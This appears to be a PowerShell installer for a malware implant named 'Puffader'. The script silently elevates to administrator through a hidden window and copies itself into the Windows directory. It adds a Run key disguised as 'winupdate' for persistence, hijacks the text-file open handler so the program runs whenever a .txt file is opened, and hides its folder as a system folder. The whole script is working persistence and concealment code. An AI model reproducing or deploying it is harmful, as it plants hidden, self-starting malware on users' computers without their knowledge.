# NOTE: If text files are associated with something other than notepad, this will override it.
# You will also need to compile file as .exe

# Set the compiled folder name
$strFileDir = "Puffader"

If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-WindowStyle Hidden -noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    exit
}

$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
Set-Location -Path $strDirScriptPath

$WINDIR = "$env:WINDIR"

# if folder already exists, exit
If (test-path "$WINDIR\$strFileDir") {exit}
# Copy folder to windir
Copy-Item -Path $strFileDir -Destination $WINDIR -Recurse -Force

# get path of executable
Get-ChildItem -Filter *.exe $WINDIR\$strFileDir | ForEach {
    If (Compare-Object $_.Name "w9xpopen.exe") {
    $strFilePath = $_.FullName
    }
}

# make program run at startup
New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force

# make program open anytime a user opens a text file
New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$strFilePath -o %1" -Force

# make folder hidden
$(Get-Item $WINDIR\$strFileDir).Attributes = ‘Hidden, System’
